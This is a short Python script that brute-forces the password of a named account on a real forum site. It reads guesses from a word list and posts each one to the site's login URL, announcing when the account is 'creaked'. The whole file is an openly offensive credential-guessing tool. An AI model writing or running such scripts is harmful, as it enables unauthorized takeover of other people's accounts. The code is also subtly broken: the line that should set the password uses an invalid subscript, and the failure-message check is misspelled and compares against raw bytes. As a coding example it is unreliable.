import urllib 
import requests
import time 
start_time = time.time()

f = open ("pw.txt")
url = 'http://cheese.formice.com/forum/login/login'
login_data ={"username":"Cfmaccount","password":"","login":""}

for x in f :
    login_data["password":x]
    r = requests.post(url, data=login_data)
    if "login faild" not in r.content :
        print ("the user has been creaked",x)
        exit()
print ("sorry cant find the password ")
print("--- %s seconds ---" % (time.time() - start_time))